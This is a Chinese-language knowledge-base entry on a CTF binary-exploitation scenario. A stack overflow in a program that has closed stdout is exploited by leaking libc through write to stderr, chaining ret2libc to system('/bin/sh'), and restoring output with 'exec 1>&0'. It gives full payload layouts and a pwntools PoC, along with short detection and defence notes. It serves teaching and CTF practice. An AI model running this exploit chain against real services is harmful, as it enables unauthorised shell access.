---
id: binary-pwn-stack-close-stdout-blind-ret2libc-fd-restore
title: close(1) 关闭 stdout 的盲态栈溢出：write(fd2,got) 泄露 libc 后 system("/bin/sh") 再 exec 1>&0 恢复输出
type: scenario
domain: binary
path: binary/pwn/stack
technique: blind-ret2libc-fd-redirect
tags:
- pwn
- ret2libc
- blind
- fd-redirect
- stack-overflow
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-33
  verified_at: '2026-11-08T17:08:50+08:00'
  notes: 已对照原文核对：vuln() buf[32] read(0,buf,0x200)（img29）、close(1) 盲态下 ROP 调 write(fd=2,got) 泄露 libc、二段 payload system(/bin/sh)、exec 1>&0 恢复 stdout 后 cat /flag 实测拿到 flag（img30 interactive 模式输出 flag{9m8ibg7zat24ilp0qyvosls1hyx30r10h}），PoC 与原文脚本逐字一致；dedup 与 binary-pwn-stack-ret2libc 触发条件/步骤明显不同，理由成立
url: /docs/binary/pwn/stack/binary-pwn-stack-close-stdout-blind-ret2libc-fd-restore/
draft: false
kb_aliases:
- close(1) 盲打 ret2libc
- fd 重定向恢复交互
---

## 一句话结论

程序 vuln() 中 buf[32] 配 read(0,buf,0x200) 存在栈溢出，但 close(1) 关闭了标准输出导致无法回显泄露；可让 write 写 fd=2（stderr）回显 GOT 泄露 libc，第二次溢出 ret2libc 执行 system("/bin/sh") 后在 shell 里 `exec 1>&0` 把 fd1 重定向回连接，恢复正常交互拿 flag。

## 原理

close(1) 只关了 fd1，溢出能力不受影响；write 的第一个参数是 fd，把 fd 设为 2（stderr）仍会回显到连接，因此用 ROP 调 write(2, got['read'], n) 读出 GOT 得到 libc 基址。第二次溢出用 rdi gadget 传 "/bin/sh" 调 system 拿 shell；此时 shell 的 stdout 仍是关闭的 fd1，但 bash 内建 `exec 1>&0` 把 fd1 复制到 fd0（客户端 socket），输出恢复，随后 cat /flag 可见。

## 触发条件

- 栈溢出点存在且长度足够布置 ROP 链；
- 程序关闭/重定向了 stdout（close(1) 或 dup2），但 fd0 连接仍存活且 stderr 未关闭；
- 附带 libc 文件可确定偏移（或用本地 libc 匹配）。

## 利用步骤

1. 泄露链：payload = 'a'*(0x20+8) + p64(pop_rdi)+p64(2) + p64(pop_rsi)+p64(elf.got['read']) + p64(elf.plt['write']) + p64(elf.plt['write']) + p64(main)，通过 stderr 回显读出 read@libc 地址，libcbase = leak - libc.sym['read']；
2. 第二次溢出：payload = 'a'*(0x20+8) + p64(pop_rdi)+p64(binsh) + p64(libcbase+libc.sym['system'])；
3. 交互模式发送 `exec 1>&0` 恢复 stdout，再 `cat /flag` 拿 flag（原文实测成功）。

## PoC

```python
ru("Close your eye, and you are blind now.")
pay = b'a'*(0x20+8)+p64(rdi)+p64(2)+p64(rsi)+p64(elf.got['read'])+p64(elf.plt['write'])+p64(elf.plt['write'])+p64(0x401207)
s(pay)
libcbase = get_addr()-libc.sym['read']
pay = b'a'*(0x20+8)+p64(rdi)+p64(bin)+p64(sys)
s(pay)
sl(b'exec 1>&0')
sl(b'cat /flag')
```

## 变体与关联

- stdout 未关但有过滤时，可改用 fd2 外带或 ORW 链直接读 flag；
- 若 close(0) 则重定向方向反过来 `exec 0>&1`；
- 与 ORW（open/read/write）场景互补：不开 shell、直接以 syscall 读 flag 文件输出到 fd2。

## 检测与防御

- 检测：服务进程在输入后立即向 stderr 输出大段二进制、随后出现 system 子进程。
- 防御：开启 PIE/Canary、检查 read 长度上限、以 seccomp 限制 execve/write 组合。
